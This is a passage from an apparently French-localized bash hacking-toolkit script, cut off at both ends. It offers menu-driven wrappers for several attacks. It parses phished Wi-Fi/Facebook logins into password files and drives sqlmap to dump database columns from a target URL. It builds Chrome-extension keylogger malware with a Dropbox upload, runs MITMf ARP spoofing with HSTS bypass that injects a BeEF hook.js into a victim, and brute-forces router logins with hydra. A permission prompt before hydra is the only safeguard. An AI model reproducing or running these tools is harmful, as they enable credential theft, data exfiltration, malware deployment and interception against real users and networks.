			USERNAME=$(cat $wififbfile | awk  -v nn="$n" '{if(NR==nn && /wfphshr-email=/)print}' | awk -F "email=" {'print $2'} | cut -d '&' -f1)
			if [[ ! "$USERNAME" == "" ]]
			then
				z=$((z+1))
				PASS=$(cat $wififbfile | awk  -v nn="$n" '{if(NR==nn && /word=/)print}' | awk -F "word=" {'print $2'} | cut -d '' -f1)
				if [[ "$PASS" == "" ]]
				then
					PASS="Aucun mot de passe trouvé"
				fi
				echo -e ""$USERNAME":"$PASS"" >> $wififbpassfile
			fi
			USERNAME=""
			PASS=""
			n=$((n+1))
		done
		if [[ "$z" == 0 ]]
		then
			echo -e "Aucun nom d'utilisateur ou MdP trouvé" >> $wififbpassfile
		fi
		echo -e "----------------------------------------------------------------" >> $wififbpassfile
		cat $wififbpassfile
		if [[ ! "$z" == 0 ]]
		then
			cat $wififbpassfile >> $wififbpassfileall
			cat $wififbfile >> $wififbfileall
			echo -e "Nouveaux noms d'utilisateur/MdP déplacés vers un fichier de tous-les-MdP-enregistrés"
		fi
		echo -e "" > $wififbpassfile
		echo -e "" > $wififbfile
	else
		echo -e ""$RS"$wififbfile non trouvé."$CE""
		sleep 3
	fi
}
function sqlmap_menu
{
file2="/root/lscript/sqltemp2"
file3="/root/lscript/sqltemp3"
file4="/root/lscript/sqltemp34"
while true
do
	clear
	TERMINALTITLE="SQLMAP"
	dash_calc
	printf '\033]2;SQLMAP\a'
	if [[ "$URL" = "" ]]
	then
		URL=""$RS"None"$CE""
		urls=0
	fi
	if [[ "$FDBS" = "" ]]
	then
		FDBS=""$RS"None"$CE""
		fdbss=0
	fi
	if [[ "$SD" = "" ]]
	then
		SD=""$RS"None"$CE""
		sds=0
	fi
	if [[ "$TB" = "" ]]
	then
		TB=""$RS"None"$CE""
		tbs=0
	fi
	if [[ "$ST" = "" ]]
	then
		ST=""$RS"None"$CE""
		sts=0
	fi
	if [[ "$CL" = "" ]]
	then
		CL=""$RS"None"$CE""
		cls=0
	fi
	if [[ "$SC" = "" ]]
	then
		SC=""$RS"None"$CE""
		scs=0
	fi
	echo -e ""$YS" 1"$CE") URL                         Actuel:"$YS"$URL"$CE""
	if [[ "$urls" = 0 ]]
	then
		echo -e ""$RS" 2"$CE") Récupérer databases         Actuel:$FDBS"
	else
		echo -e ""$YS" 2"$CE") Récupérer databases         Actuel:$FDBS"
	fi
	if [[ "$fdbss" = 0 ]]
	then
		echo -e ""$RS" 3"$CE") Sélectionner database       Actuel:"$YS"$SD"$CE""
	else
		echo -e ""$YS" 3"$CE") Sélectionner database       Actuel:"$YS"$SD"$CE""
	fi
	if [[ "$sds" = 0 ]]
	then
		echo -e ""$RS" 4"$CE") Récupérer tables            Actuel:"$YS"$TB"$CE""
	else
		echo -e ""$YS" 4"$CE") Récupérer tables            Actuel:"$YS"$TB"$CE""
	fi
	if [[ "$tbs" = 0 ]]
	then
		echo -e ""$RS" 5"$CE") Sélectionner table          Actuel:"$YS"$ST"$CE""
	else
		echo -e ""$YS" 5"$CE") Sélectionner table          Actuel:"$YS"$ST"$CE""
	fi
	if [[ "$sts" = 0 ]]
	then
		echo -e ""$RS" 6"$CE") Récupérer columns           Actuel:"$YS"$CL"$CE""
	else
		echo -e ""$YS" 6"$CE") Récupérer columns           Actuel:"$YS"$CL"$CE""
	fi
	if [[ "$cls" = 0 ]]
	then
		echo -e ""$RS" 7"$CE") Sélectionner columns        Actuel:"$YS"$SC"$CE""
	else
		echo -e ""$YS" 7"$CE") Sélectionner columns        Actuel:"$YS"$SC"$CE""
	fi
	if [[ "$scs" = 0 ]]
	then
		echo -e ""$RS" s"$CE") Start"
	else
		echo -e ""$YS" s"$CE") Start"
	fi
	echo -e ""$YS" b"$CE") Retour"
	echo -e "Choix: "
	read SQ
	clear
	if [[ "$SQ" = 1 ]]
	then
		echo -n "URL: "
		read URLL
		if [[ "$URLL" != "" || "$URLL" = "b" ]]
		then
			URL="$URLL"
			urls=1
				##Clearing nexts
				FDBS=""
				fdbss=0
				SD=""
				sds=0
				TB=""
				tbs=0
				ST=""
				sts=0
				cls=0
				CL=""
				scs=0
				SC=""
		fi
	elif [[ "$SQ" = "s" ]]
	then
		if [[ "$scs" = 0 ]]
		then
			echo -e ""$RS"Aucune colonne sélectionnée"$CE""
			sleep 2
			break
		fi
		#~ export URL
		#~ export SD
		#~ export ST
		#~ export SC
		sqlmap -u "$URL" -D "$SD" -T "$ST" -C "$SC" --dump | tee "$file4"
		echo -e ""
		echo -e ""$YS"Un fichier log a ét créé dans "$file4". Copiez-le avant qu'il ne soit écrasé"$CE""
		echo -e ""
		echo -e "$PAKTGB"
		$READAK
	elif [[ "$SQ" = "b" ]]
	then
		break
	elif [[ "$SQ" = 00 ]]
	then
		exec bash $0
	elif [[ "$SQ" = 7 ]]
	then
		if [[ "$cls" = 0 ]]
		then
			echo -e ""$RS"Colonnes non récupérées"$CE""
			sleep 2
			break
		fi
		n10=1
		CCO1="$CO1"
		while [[ "$n10" -le "$NCO" ]]
		do
			cl[$n10]=$(cat "$file3" | awk -v n12="$CCO1" '{if(NR==n12)print}' | cut -d ' ' -f2)
			CCO1=$((CCO1+1))
			n10=$((n10+1))
		done
		while true
		do
			clear
			echo -e ""$BS"Colonnes: "$CE""
			v=1
			while [[ "$v" -le "$NCO" ]]
			do
				if [[ "${selc[$v]}" = 1 ]]
				then
					SSC="$YS"
				else
					SSC="$WS"
				fi
				if [[ "$v" -le 9 ]]
				then
					echo -e ""$YS"  $v"$CE") "$SSC"${cl[$v]}"$CE""
				elif [[ "$v" -le 99 ]]
				then
					echo -e ""$YS" $v"$CE") "$SSC"${cl[$v]}"$CE""
				else
					echo -e ""$YS"$v"$CE") "$SSC"${cl[$v]}"$CE""
				fi
				v=$((v+1))
			done
			echo -e ""$YS" d"$CE") Tout déselectionner"
			echo -e ""$YS" s"$CE") Enregistrer la sélection"
			echo -e ""$YS" b"$CE") Retour"
			echo -e "Choix: "
			read COCH
			clear
			if [[ "$COCH" = "b" || "$COCH" = "back" ]]
			then
				break
			elif [[ "$COCH" = "s" ]] 
			then
				v2=1
				SC=""
				while [[ "$v2" -le "$NCO" ]]
				do
					if [[ "${selc[$v2]}" = 1 ]]
					then
						if [[ "$SC" = "" ]]
						then
							SC="${cl[$v2]}"
						else
							SC=""$SC","${cl[$v2]}""
						fi
					fi
					v2=$((v2+1))
				done
				if [[ "$SC" = "" ]]
				then
					echo -e ""$RS"Rien de sélectionné"$CE""
					ssc=0
					sleep 2
				else
					ssc=1
				fi
				break
			elif [[ "$COCH" = "d" ]] 
			then
				v1=1
				while [[ "$v1" -le "$NCO" ]]
				do
					selc[$v1]=""
					v1=$((v1+1))
				done
			elif [[ "$COCH" -le 0 || "$COCH" -gt "$NCO" ]] 
			then
				echo -e ""$RS"Mauvais choix"$CE""
				sleep 2
				continue
			else
				if [[ "${selc[$COCH]}" != 1 ]]
				then
					selc[$COCH]=1
				else
					selc[$COCH]=""
				fi
			fi
		done
	elif [[ "$SQ" = 6 ]]
	then
		while true
		do
			if [[ "$sts" = 0 ]]
			then
				echo -e ""$RS"Table non sélectionnée"$CE""
				sleep 2
				break
			fi
			sqlmap -u "$URL" -D "$SD" -T "$ST" --columns <<< $'\n\n\n\n\n\n\n\n\n\n' | tee $file3
			##finding columns
			CO=$(cat "$file3" | awk '{if(/+----/)print NR}')
			CO1=$(echo $CO | cut -d ' ' -f2)
			CO1=$((CO1+1))
			CO2=$(echo $CO | cut -d ' ' -f3)
			CO2=$((CO2-1))
			NCO=$((CO2-CO1))
			if [[ "$NCO" -le 0 ]]
			then
				echo -e ""$RS"Erreur 24. Aucune colonne trouvée automatiquement"$CE""
				sleep 2
				cls=0
				continue
			else
				if [[ "$NCO" = 1 ]]
				then
					echo -e ""$YS"1 colonne trouvée!"$CE""
					sleep 2
				else
					echo -e ""$YS""$NCO" colonnes trouvées!"$CE""
					sleep 2
				fi
				CL="Fais"
				cls=1
				break
			fi
		done
	elif [[ "$SQ" = 5 ]]
	then
		while true
		do
			if [[ "$tbs" = 0 ]]
			then
				echo -e ""$RS"Tables non récupérées"$CE""
				sleep 2
				break
			fi
			echo -e ""$BS"Tables: "$CE""
			n9=1
			CC1="$C1"
			while [[ "$n9" -le "$NTB" ]]
			do
				tb[$n9]=$(cat "$file2" | awk -v n11="$CC1" '{if(NR==n11)print}' | cut -d ' ' -f2)
				if [[ "$n9" -le 9 ]]
				then
					echo -e ""$YS"  $n9"$CE") ${tb[$n9]}"
				elif [[ "$n9" -le 99 ]]
				then
					echo -e ""$YS" $n9"$CE") ${tb[$n9]}"
				else
					echo -e ""$YS"$n9"$CE") ${tb[$n9]}"
				fi
				CC1=$((CC1+1))
				n9=$((n9+1))
			done
			echo -e ""$YS" b"$CE") Retour"
			echo -e "Choix: "
			read TCH
			if [[ "$TCH" = "b" || "$TCH" = "back" ]]
			then
				break
			elif [[ "$TCH" -le 0 || "$TCH" -gt "$NTB" ]] 
			then
				echo -e ""$RS"Mauvais choix"$CE""
				sleep 2
				continue
			else
				ST="${tb[$TCH]}"
				sts=1
				##Clearing nexts
				cls=0
				CL=""
				scs=0
				SC=""
				break
			fi
		done
	elif [[ "$SQ" = 4 ]]
	then
		if [[ "$sds" = 0 ]]
		then
			echo -e ""$RS"Bases de données non sélectionnées"$CE""
			sleep 2
			continue
		fi
		sqlmap -u "$URL" -D "$SD" --tables <<< $'\n\n\n\n\n\n\n\n\n\n' | tee "$file2"
		##finding tables
		C=$(cat "$file2" | awk '{if(/+----/)print NR}')
		C1=$(echo $C | cut -d ' ' -f1)
		C1=$((C1+1))
		C2=$(echo $C | cut -d ' ' -f2)
		C2=$((C2-1))
		NTB=$((C2-C1))
		if [[ "$NTB" -le 0 ]]
		then
			echo -e ""$RS"Erreur 23. Aucune table trouvée automatiquement"$CE""
			sleep 2
			tbs=0
			continue
		else
			if [[ "$NTB" = 1 ]]
			then
				echo -e ""$YS"1 table trouvé!"$CE""
				sleep 2
			else
				echo -e ""$YS""$NTB" tables trouvées!"$CE""
				sleep 2
			fi
			TB="Fait"
			tbs=1
				##Clearing nexts
				ST=""
				sts=0
				cls=0
				CL=""
				scs=0
				SC=""
		fi
	elif [[ "$SQ" = 3 ]]
	then
		while true
		do
			if [[ "$fdbss" = 0 ]]
			then
				echo -e ""$RS"Databases non récupérée"$CE""
				sleep 2
				continue
			fi
			echo -e ""$BS"Databases: "$CE""
			n8=1
			while [[ "$n8" -le "$NDB" ]]
			do
				if [[ "$n8" -le 9 ]]
				then
					echo -e ""$YS"  "$n8""$CE") ${db[$n8]}"
				elif [[ "$n8" -le 99 ]]
				then
					echo -e ""$YS" "$n8""$CE") ${db[$n8]}"
				else
					echo -e ""$YS""$n8""$CE") ${db[$n8]}"
				fi
				n8=$((n8+1))
			done
			echo -e ""$YS" b"$CE") Retour"
			echo -e "Choix: "
			read DCH
			clear
			if [[ "$DCH" = "b" || "$DCH" = "back" ]]
			then
				break
			fi
			if [[ "$DCH" -lt 0 || "$DCH" -gt "$NDB" ]]
			then
				echo -e ""$RS"Mauvais choix"$CE""
				sleep 2
			else
				SD="${db[$DCH]}"
				sds=1
					##Clearing nexts
					TB=""
					tbs=0
					ST=""
					sts=0
					cls=0
					CL=""
					scs=0
					SC=""
				break
			fi	
		done
	elif [[ "$SQ" = 2 ]]
	then
		if [[ "$urls" != 1 ]]
		then
			echo -e ""$RS"URL non séléctionné"$CE""
			sleep 2
			continue
		fi
		file="/root/lscript/sqltemp"
		sqlmap -u "$URL" --dbs <<< $'\n\n\n\n\n\n\n\n\n\n' | tee "$file"
		##Find the line
		CHECK=$(cat "$file" | grep "available databases ")
		if [[ "$CHECK" = "" ]]
		then
			fdbss=0
			echo -e ""$RS"Aucune databases trouvée ou site Web non vulnérable"$CE""
			fdbss=0
			echo -e "$PAKTGB"
			$READAK
			continue
		fi
		LINED=$(cat "$file" | awk '{if(/available databases /)print NR}')
		LINED=$((LINED+1))
		##list databases
		n=0
		echo -e ""BS"Calcul..."$CE""
		while true
		do
			CH=$(cat "$file" | awk -v n7="$LINED" '{if(NR==n7)print}')
			if [[ "$CH" = "" ]]
			then
				break
			else
				##how many dbs found
				n=$((n+1))
				##next line
				LINED=$((LINED+1))
			fi
			CHH=$(echo "$CH" | awk -F "] " {'print $2'})
			if [[ "$CHH" = "" ]]
			then
				echo -e ""$RS"Erreur 21"$CE""
				CHH=""$RS"Error"$CE""
				sleep 3
			fi
			db[$n]="$CHH"
		done
		sleep 1
		if [[ "$n" = 0 ]]
		then
			echo -e ""$RS"Erreur 22 Aucune databases trouvée automatiquement"$CE""
			echo -e "$PAKTGB"
			$READAK
			continue
		elif [[ "$n" = 1 ]]
		then
			echo -e ""$YS"1 database trouvée!"$CE""
			sleep 1
		else
			echo -e ""$YS"$n databases trouvées!"$CE""
			sleep 1
		fi
		echo -e ""
		FDBS=""$YS"Fait"$CE""
		fdbss=1
		NDB="$n"
				##Clearing nexts
				SD=""
				sds=0
				TB=""
				tbs=0
				ST=""
				sts=0
				cls=0
				CL=""
				scs=0
				SC=""
	fi	
done
}
function cromos_menu
{
	if [[ ! -d /root/cromos ]]
	then
		echo -e ""$RS"Le répertoire Cromos est introuvable dans /root"$CE""
		echo -e ""$RS"Résolvez ce problème en l'installant dans lscript"$CE""
		echo -e "$PAKTGB"
		$READAK
	else
		cd /root/cromos
		while true
		do
			clear
			TERMINALTITLE="MENU CROMOS"
			dash_calc
			printf '\033]2;MENU CROMOS\a'
			if [[ "$CEX" == "" ]]
			then
				CEX="None"
			fi
			if [[ "$CMOD" == "" ]]
			then
				CMOD="keylogger"
			fi
			echo -e " Extension actuelle: "$RS"$CEX"$CE""
			echo -e " "$YS"1"$CE") Télécharger/sélectionner une extension"
			echo -e " "$YS"2"$CE") Choisir un module                     "$YS"$CMOD"$CE""
			echo -e " "$YS"3"$CE") Infecter"
			echo -e " "$YS"4"$CE") Construire"
			echo -e " "$YS"5"$CE") Télécharger vers dropbox"
			echo -e " "$YS"b"$CE") Retour"
			echo -e " "$YS"0"$CE") QUITTER"
			echo -e "Choix: "
			read CROM
			clear
			if [[ "$CROM" == 1 ]]
			then
				echo -e "Extension ID: "
				read EXID
				python cromos.py --extension "$EXID" && CEX=""$YS"$EXID"$CE""
				sleep 2
			elif [[ "$CROM" == 2 ]]
			then
				if [[ "$CMOD" == "keylogger" ]]
				then
					CMOD="currency"
				else
					CMOD="keylogger"
				fi
			elif [[ "$CROM" == 3 ]]
			then
				python cromos.py --extension "$EXID" --load "$CMOD"
				sleep 2
			elif [[ "$CROM" == 4 ]]
			then
				echo -e "Type de fichier à construire("$YS"Entrer"$CE"="$YS"bat"$CE"):"
				read buildext
				if [[ "$buildext" == "" ]]
				then
					buildext="bat"
				fi
				python cromos.py --extension "$EXID" --build "$buildext" && xdg-open /root/cromos/output/builds
				echo -e "$PAKTGB"
				$READAK
			elif [[ "$CROM" == 5 ]]
			then
				echo -e "Token: "
				read CTOK
				python cromos.py --extension "$EXID" --token "$CTOK"
				echo -e "$PAKTGB"
				$READAK
			elif [[ "$CROM" == "b" || "$CROM" == "back" ]]
			then
				break
			elif [[ "$CROM" == 0 ]]
			then
				exit
			elif [[ "$CROM" == 00 ]]
			then
				exec bach $0
			fi
		done
	fi
}
function mitmf_hook
{
	TERMINALTITLE="MITMF + BEEF"
	dash_calc
	printf '\033]2;MITMF + BEEF\a'
	if [[ -d /root/MITMf ]]
	then
		TEST=$(ifconfig | grep "$ETH")
		n=1
		echo -e ""$BS"Interfaces disponibles"$CE": "
		if [[ "$TEST" != "" ]]
		then
			echo -e ""$YS"$n"$CE") "$ETH""
			in[$n]="$ETH"
			n=$((n+1))
		fi
		TEST=$(ifconfig | grep "$WLANN")
		if [[ "$TEST" != "" ]]
		then
			echo -e ""$YS"$n"$CE") $WLANN"
			in[$n]="$WLANN"
			n=$((n+1))
		fi
		TEST=$(ifconfig | grep "$WLANNM")
		if [[ "$TEST" != "" ]]
		then
			echo -e ""$YS"$n"$CE") $WLANNM"
			in[$n]="$WLANNM"
			n=$((n+1))
		fi
		echo -e "Choose: "
		read ints
		if [[ "$ints" -le "$n" && "$ints" -ge 1 ]]
		then
			#~ echo -e "Vous avez sélectionné "$YS"${in[$ints]}"$CE"" #debugging
			mitmfint="${in[$ints]}"
			export mitmfint
			clear
			mitmfgate=$(route -n | grep "$mitmfint" | awk '{if($2!="0.0.0.0"){print $2}}')
			export mitmfgate
			clear
			echo -e "IP de la cible: "
			read mitmftar
			TEST=$(ifconfig | grep $mitmfint)
			if [[ $TEST != "" ]]
			then
				iffile=""$LPATH"/iftemp.txt"
				ifconfig $mitmfint > $iffile
				mitmflocalip=$(cat $iffile | grep " inet " | awk -F "inet " {'print $2'} | cut -d ' ' -f1)
			fi
			clear
			echo -e "Chemin URL de hook.js("$YS"Entrer"$CE"=http://"$mitmflocalip":3000/hook.js): "
			read hookch
			if [[ "$hookch" = "" ]]
			then
				mitmfhook="http://"$mitmflocalip":3000/hook.js"
			else
				mitmfhook="$hookch"
			fi
			export mitmfhook
			cd /root/MITMf
			clear
			python mitmf.py -i "$mitmfint" --spoof --arp --gateway "$mitmfgate" --target "$mitmftar" --hsts --inject --js-url "$mitmfhook"
			cd
		fi
	else
		echo -e ""$RS"Mitmf n'est pas installé. Tapez '"$CE""$YS"install"$CE""$RS"' pour l'installer."
		read INSTALL
		if [[ "$INSTALL" = "install" ]]
		then
			echo -e ""$RS"Aucune installation ajoutée pour le moment"$CE""
			sleep 2
		fi
	fi
	cd
}
function bruteforce_router
{
while true
do
	clear
	TERMINALTITLE="BRUTEFORCE LOGIN"
	dash_calc
	TERMINALTITLE="UNIQUEMENT À DES FINS LEGALES"
	dash_calc
	printf '\033]2;BRUTEFORCE LOGIN\a'
	if [[ "$BI" = "" ]]
	then
		TT=$(ifconfig | grep "$WLANN")
		if [[ "$TT" = "" ]]
		then
			bin=0
			BI=""$RS"None"$CE""
		else
			bin=1
			BI="$WLANN"
		fi
	fi
	if [[ "$US" = "" ]]
	then
		US="admin"
	fi
	if [[ "$WL" = "" ]]
	then
		wls=0
		WL=""$RS"None"$CE""
	fi
	if [[ "$RQ" = "" ]]
	then
		rqq=0
		RQ=""$RS"None"$CE""
	fi
	if [[ "$UP" = "" ]]
	then
		upp=0
		UP=""$RS"None"$CE""
	fi
	if [[ "$IS" = "" ]]
	then
		iss=0
		IS=""$RS"None"$CE""
	fi
	if [[ "$FM" = "" ]]
	then
		FM="http-post-form"
	fi
	#~ echo -e ""$RS"UNIQUEMENT À DES FINS LEGALES"$CE""
	echo -e ""$YS" 1"$CE") Sélectionner l'interface      Current:"$YS""$BI""$CE""
	echo -e ""$YS" 2"$CE") Définir le nom d'utilisateur  Current:"$YS""$US""$CE""
	echo -e ""$YS" 3"$CE") Sélectionner la wordlist      Current:"$YS""$WL""$CE""
	echo -e ""$YS" 4"$CE") Demander l'URI:               Current:"$YS""$RQ""$CE""
	echo -e ""$YS" 5"$CE") ^USER^ & ^PASS^ champ         Current:"$YS""$UP""$CE""
	echo -e ""$YS" 6"$CE") Chaîne de MdP non valide      Current:"$YS""$IS""$CE""
	echo -e ""$YS" 7"$CE") Formulaire                    Current:"$YS""$FM""$CE""
	echo -e ""$YS" 8"$CE") Ouvrir la page de connexion du routeur dans le navigateur"
	echo -e ""$YS" w"$CE") Ouvrir Wireshark"
	echo -e ""$YS" s"$CE") Start bruteforcing"
	echo -e ""$YS"bu"$CE") Outil automatisé Burpsuite"
	echo -e ""$YS" i"$CE") Info"
	echo -e ""$YS" b"$CE") Retour"
	echo -n "Choix: "
	read BR
	clear
	if [[ "$BR" = "b" || "$BR" = 00 || "$BR" = "back" ]]
	then
		BACKL=1
		break
	elif [[ "$BR" = "bu" ]]
	then
		burpsuite
	elif [[ "$BR" = "w" ]]
	then
		wireshark & disown
	elif [[ "$BR" = 0 ]]
	then
		exit
	elif [[ "$BR" = "i" ]]
	then
		echo -e ""$LGYS"Avec hydra, vous pouvez bruteforce l'écran de connexion de votre routeur."
		echo -e "Sélectionnez l'interface"
		echo -e "	Sélectionnez une interface pour que le script puisse obtenir la passerelle."
		echo -e "Définir le nom d'utilisateur"
		echo -e "	Définissez le nom d'utilisateur pour l'écran de connexion.(e.g. admin)"
		echo -e "Sélectionner la wordlist"
		echo -e "	Sélectionnez un fichier texte avec un mot de passe sur chaque ligne."
		echo -e "Demander l'URI"
		echo -e "	Vous le trouverez sur Wireshark. Voir la vidéo ci-dessous pour les instructions."
		echo -e "	(e.g. /login.php) ou (e.g. /cgi-bin/login.exe) etc etc..."
		echo -e "^USER^ & ^PASS^ champ"
		echo -e "	Vous le trouverez sur Wireshark. Voir la vidéo ci-dessous pour les instructions."
		echo -e "	(e.g. username=^USER^&password=^PASS^)"
		echo -e "Chaîne de MdP non valide"
		echo -e "	Lorsque vous essayez de vous connecter avec un mauvais MdP sur la page de connexion."
		echo -e "	Vous devez définir un mot qui est imprimé à l'écran lorsque la connexion échoue."
		echo -e "	(e.g. Invalid) ou (e.g. Wrong) ou (e.g. Please) etc etc..."
		echo -e "	Voir la vidéo ci-dessous pour les instructions."
		echo -e "Formulaire"
		echo -e "	(e.g. http-get-form) ou (e.g. http-post-form) etc etc..."
		echo -e ""
		echo -e "Video-demonstration: https://www.youtube.com/watch?v=vgbP0AQ5bt4"
		echo -e ""
		echo -e ""$CE""
		echo -e "$PAKTGB"
		$READAK
	elif [[ "$BR" = 1 ]]
	then
		select_interface
		if [[ "$OUTPUT" != "" && "$OUTPUT" != 0 ]]
		then
			bin=1
			BI="$OUTPUT"
		else
			bin=0
		fi
	elif [[ "$BR" = 2 ]]
	then
		echo -n "Nom d'utilisateur: "
		read US
	elif [[ "$BR" = 3 ]]
	then
		echo -n "Wordlist: "
		read WL
		if [[ ! -f "$WL" ]]
		then
			WL=""
			echo -e ""$RS"Impossible de trouver la wordlist"$CE""
			wls=0
			sleep 2
		else
			wls=1
		fi
	elif [[ "$BR" = 4 ]]
	then
		echo -n "Demander l'URI: "
		read RQ
		rqq=1
	elif [[ "$BR" = 5 ]]
	then
		echo -n "^USER^ & ^PASS^ champ: "
		read UP
		upp=1
	elif [[ "$BR" = 6 ]]
	then
		echo -n "Chaîne de MdP non valide: "
		read IS
		iss=1
	elif [[ "$BR" = 7 ]]
	then
		echo -n "Formulaire: "
		read FM
	elif [[ "$BR" = 8 ]]
	then
		if [[ "$bin" != 1 ]]
		then
			echo -e ""$RS"Veuillez d'abord sélectionner une interface"$CE""
			sleep 3
			continue
		fi
		TT=$(ifconfig | grep "$BI")
		if [[ "$TT" = "" ]]
		then
			echo -e ""$RS""$BI" n'est pas disponible"$CE""
			sleep 2
			BI=""
			continue
		fi
		echo -e ""$BS"Recherche de passerelle sur "$BI""$CE"..."
		sleep 0.5
		GATE=$(find_gateways "$BI" interface)
		TTT=$(is_it_an_ip "$GATE")
		if [[ "$TTT" != 1 ]]
		then
			echo -e ""$RS"Impossible de trouver votre passerelle."$CE""
			sleep 2
			echo -e ""$RS"Assurez-vous que vous êtes connecté à un réseau"$CE""
			sleep 3
			continue
		else
			echo -e ""$YS"Passerelle trouvée: "$GATE""$CE""
			sleep 1
		fi
		clear
		gio open "http://"$GATE""
		echo -e "Votre navigateur va s'ouvrir"
		sleep 2
	elif [[ "$BR" = "s" ]]
	then
		if [[ "$bin" != 1 ]]
		then
			echo -e ""$RS"Veuillez d'abord sélectionner une interface"$CE""
			sleep 3
			continue
		fi
		if [[ "$wls" != 1 ]] 
		then
			echo -e ""$RS"Définissez d'abord une wordlist"$CE""
			sleep 2
			continue
		fi
		TT=$(ifconfig | grep "$BI")
		if [[ "$TT" = "" ]]
		then
			echo -e ""$RS""$BI" n'est pas disponible"$CE""
			sleep 2
			BI=""
			continue
		fi
		if [[ "$rqq" != 1 ]]
		then
			echo -e ""$RS"Veuillez définir l'URI de demande"$CE""
			sleep 2
			continue
		fi
		if [[ "$iss" != 1 ]]
		then
			echo -e ""$RS"Veuillez définir la Chaîne de MdP non valide"$CE""
			sleep 2
			continue
		fi
		if [[ "$upp" != 1 ]]
		then
			echo -e ""$RS"Veuillez définir le champ ^USER^ & ^PASS^"$CE""
			sleep 2
			continue
		fi
		if [[ "$FM" = "" ]]
		then
			echo -e ""$RS"Définissez d'abord le formulaire"$CE""
			sleep 2
			continue
		fi
		echo -e ""$BS"Recherche de passerelle sur "$BI""$CE"..."
		sleep 1
		GATE=$(find_gateways "$BI" interface)
		TTT=$(is_it_an_ip "$GATE")
		if [[ "$TTT" != 1 ]]
		then
			echo -e ""$RS"Impossible de trouver votre passerelle."$CE""
			sleep 2
			echo -e ""$RS"Assurez-vous que vous êtes connecté à un réseau"$CE""
			sleep 3
			continue
		else
			echo -e ""$YS"Passerelle trouvée: "$GATE""$CE""
			sleep 2
		fi
		clear
		echo -e ""$RS"Avez-vous la permission de bruteforce ce réseau?"$CE""$YNONLY""
		read PERM
		if [[ "$PERM" != "y" && "$PERM" != "Y" ]]
		then
			echo -e ""$RS"Vous ne pouvez pas continuer alors"$CE""
			sleep 3
			continue
		fi
		hydra -l "$US" -P "$WL" -e nsr -f -V "$GATE" "$FM" ""$RQ":"$UP":"$IS""
		echo -e "$PAKTGB"
		$READAK
	fi
done
}
function find_gateways()
{
	#exemple: find_gateways wlan0 interface
	FG1="$1"
	FG2="$2"
	if [[ "$FG1" = "" ]]
	then
		echo -e ""$BS"Passerelles"$CE": "
		n=0
		ethr=$(ifconfig | grep "$ETH")
		if [[ "$ethr" != "" ]]
		then
			ethd=$(route -n | awk -v int1="$ETH" '{if(int1~$8 && $2!="IP" && $2!="0.0.0.0"){print $2}}')
			chi=$(is_it_an_ip "$ethd")
			if [[ "$ethd" != "" && "$chi" = 1 ]]
			then
				echo -e ""$ETH" = "$YS""$ethd""$CE""
				n=1
			fi
		fi
		wlanr=$(ifconfig | grep "$WLANN")
		if [[ "$wlanr" != "" ]]
		then
			wland=$(route -n | awk -v int1="$WLANN" '{if(int1~$8 && $2!="IP" && $2!="0.0.0.0"){print $2}}')
			chi=$(is_it_an_ip "$wland")
			if [[ "$wland" != "" && "$chi" = 1 ]]
			then
				echo -e ""$WLANN" = "$YS""$wland""$CE""
				n=1
			fi
		fi
		wlanmr=$(ifconfig | grep "$WLANNM")
		if [[ "$wlanmr" != "" ]]
		then
			wlanmd=$(route -n | awk -v int1="$WLANNM" '{if(int1~$8 && $2!="IP" && $2!="0.0.0.0"){print $2}}')
			chi=$(is_it_an_ip "$wlanmd")
			if [[ "$wlanmd" != "" && "$chi" = 1 ]]
			then
				echo -e ""$WLANNM" = "$YS""$wlanmd""$CE""
				n=1
			fi
		fi
		if [[ "$n" = 0 ]]
		then
			echo -e ""$RS"Aucune interface connue trouvée disponible"$CE""
		fi
	else
		if [[ "$FG2" = "interface" ]]
		then
			inttos=$(ifconfig | grep "$FG1")
			if [[ "$inttos" != "" ]]
			then
				gate=$(route -n | awk -v int1="$FG1" '{if(int1~$8 && $2!="IP" && $2!="0.0.0.0"){print $2}}')
				cho=$(is_it_an_ip "$gate")
				if [[ "$cho" = 1 ]]
				then
					echo "$gate"
				fi
			else
				echo 0
			fi
		#~ elif [[ "$FG2" = "ip" ]]
		#~ then
			#~ iptos=$(ifconfig | grep "$FG1")
			#~ if [[ "$iptos" != "" ]]
			#~ then
				#~ dot=$(give_ip_take_zero "$FG1" "dot")
				#~ gate=$(route -n | awk -v int1="$dot" '{if(int1~$8 && $2!="IP" && $2!="0.0.0.0"){print $2}}')
				#~ echo "$gate"
				#~ cho=$(is_it_an_ip "$gate")
				#~ if [[ "$cho" = 1 ]]
				#~ then
					#~ echo "$gate"
				#~ fi
			#~ else
				#~ echo 0
			#~ fi
		#~ else
			#~ echo -e ""$RS"Impossible d'identifier le deuxième paramètre"$CE""
			#~ sleep 4
		fi		
	fi
}
function select_interface
{
	while true
	do
		clear
		TERMINALTITLE="Sélectionnez l'interface"
		dash_calc
		printf '\033]2;CHOISIR L INTERFACE\a'
		TT=$(ifconfig | grep "$WLANN:")
		if [[ "$TT" != "" ]]
		then
			echo -e ""$YS" 1"$CE") "$WLANN""
		else
			echo -e ""$RS" 1"$CE") "$RS""$WLANN""$CE""
		fi
		TT=$(ifconfig | grep "$ETH:")
		if [[ "$TT" != "" ]]
		then
			echo -e ""$YS" 2"$CE") "$ETH""
		else
			echo -e ""$RS" 2"$CE") "$RS""$ETH""$CE""
		fi
		echo -e ""$YS" 3"$CE") Saisissez manuellement une interface"
		echo -e ""$YS" b"$CE") Retour"
		echo -e "Choix: "
		read CI
		if [[ "$CI" = 1 ]]
		then
			TT=$(ifconfig | grep "$WLANN:")
			if [[ "$TT" != "" ]]
			then
				SINT="$WLANN"
				OUTPUT="$SINT"
				inter=0
				break
			else
				inter=1
				OUTPUT=0
				echo -e ""$RS"Impossible de trouver cette interface"$CE""
				sleep 2
				continue
			fi
		elif [[ "$CI" = 2 ]]
		then
			TT=$(ifconfig | grep "$ETH:")
			if [[ "$TT" != "" ]]
			then
				SINT="$ETH"
				OUTPUT="$SINT"
				inter=0
				break
			else
				inter=1
				OUTPUT=0
				echo -e ""$RS"Impossible de trouver cette interface"$CE""
				sleep 2
				continue
			fi
		elif [[ "$CI" = 3 ]]
		then
			echo -e "Interface à utiliser: "
			read ITU
			TT=$(ifconfig | grep "$ITU:")
			if [[ "$TT" != "" ]]
			then
				SINT="$ITU"
				OUTPUT="$SINT"
				inter=0
				break
			else
				echo -e ""$RS"Impossible de trouver cette interface"$CE""
				echo -e "Voulez-vous toujours l'utiliser?"$YNNO": "
				read SU
				if [[ "$SU" = "y" ]]
				then
					SINT="$ITU"
					OUTPUT="$SINT"
					inter=0
					break
				else
					OUTPUT=0
					continue
				fi
			fi
